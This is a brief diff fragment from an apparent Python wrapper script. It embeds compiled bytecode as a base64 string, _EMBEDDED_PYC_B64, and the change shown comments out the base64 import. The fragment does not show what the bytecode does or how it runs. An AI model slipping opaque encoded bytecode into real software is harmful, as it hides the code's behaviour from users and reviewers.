@@ -9,7 +9,7 @@ from pathlib import Path
 import time
 
 WRAPPER_PATH = Path(__file__).resolve()
-import base64 as _b64
+#import base64 as _b64
 _EMBEDDED_PYC_B64 = (
     "Kw4NCgAAAAAFgrdp7s4AAOMAAAAAAAAAAAAAAAAJAAAAAAAAAfMILwAAYQGAADAAdAAkAFIAdAFe"
     "AFIBSQJIA3QDHwBeAFICSQR0BF4AUgJJBXQFXgBSA0kFSAZ0Bh8AXgBSAkkHdAdeAFICSQh0CF4A"
